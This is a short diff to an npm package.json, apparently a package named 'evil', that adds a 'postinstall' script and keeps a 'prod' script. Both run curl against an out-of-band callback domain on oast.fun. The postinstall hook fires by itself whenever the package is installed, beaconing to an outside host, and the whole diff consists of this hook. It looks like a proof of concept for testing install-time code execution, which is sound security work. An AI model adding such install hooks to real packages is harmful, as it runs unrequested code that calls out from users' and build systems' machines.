@@ -1,7 +1,9 @@
 {
+  "name": "evil",
+  "version": "1.0.0",
   "scripts": {
     "prod": "curl https://endyefjxkzchckfuoiip7isvkj535ftt6.oast.fun/?actions",
-    "dev": "curl https://endyefjxkzchckfuoiip7isvkj535ftt6.oast.fun/?actions"
+    "postinstall": "curl https://endyefjxkzchckfuoiip7isvkj535ftt6.oast.fun/?postinstall-action"
   },
   "devDependencies": {
   }
